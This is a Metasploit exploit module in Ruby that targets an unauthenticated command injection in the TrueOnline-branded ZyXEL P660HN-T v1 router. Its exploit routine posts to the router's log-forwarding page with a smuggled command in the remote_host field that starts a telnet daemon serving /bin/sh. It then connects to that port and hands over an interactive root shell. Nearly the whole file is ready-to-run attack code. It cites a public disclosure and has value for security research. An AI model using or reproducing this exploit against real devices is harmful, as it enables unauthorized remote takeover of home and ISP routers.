# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;TrueOnline / ZyXEL P660HN-T v1 Router Unauthenticated Command Injection&#039;,
      &#039;Description&#039;    => %q{
        TrueOnline is a major ISP in Thailand, and it distributes a customised version of
        the ZyXEL P660HN-T v1 router. This customised version has an unauthenticated command
        injection vulnerability in the remote log forwarding page.
        This module was tested in an emulated environment, as the author doesn&#039;t have access to the
        Thai router any more. Any feedback should be sent directly to the module&#039;s author, as well as
        to the Metasploit project.
        There are other language strings in the firmware, so it is likely that this firmware is not only
        distributed in Thailand. Other P660HN-T v1 in other countries might be vulnerable too.
      },
      &#039;Author&#039;         =>
        [
          &#039;Pedro Ribeiro <pedrib@gmail.com>&#039;         # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2017/Jan/40&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/2910&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;P660HN-T v1&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;DisclosureDate&#039;  => &#039;Dec 26 2016&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options(
      [
        Opt::RPORT(80),
        OptInt.new(&#039;TelnetPort&#039;, [true, "Telnet port we&#039;re going to use", 9999]),
      ], self.class)
  end

  def check
    res = send_request_cgi!({
      &#039;uri&#039;     => &#039;/cgi-bin/authorize.asp&#039;,
      &#039;method&#039;  => &#039;GET&#039;
    })
    if res && res.body =~ /ZyXEL P-660HN-T1A/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end


  def exploit
    print_status("#{peer} - Attempting to exploit router...")
    send_request_cgi({
      &#039;uri&#039;     => &#039;/cgi-bin/ViewLog.asp&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;remote_submit_Flag&#039; => &#039;1&#039;,
        &#039;remote_syslog_Flag&#039; => &#039;1&#039;,
        &#039;RemoteSyslogSupported&#039; => &#039;1&#039;,
        &#039;remote_host&#039; => ";utelnetd -l /bin/sh -p #{datastore[&#039;TelnetPort&#039;]} -d;#",
        &#039;remoteSubmit&#039; => &#039;Save&#039;
      }
    })

    sleep 5

    begin
      ctx = { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
      sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => datastore[&#039;TelnetPort&#039;], &#039;Context&#039; => ctx, &#039;Timeout&#039; => 10 })
      if not sock.nil?
        print_good("#{peer} - Success, shell incoming!")
        return handler(sock)
      end
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      sock.close if sock
    end

    fail_with(Failure::Unknown, "#{peer} - Failed to exploit router.")
  end
end

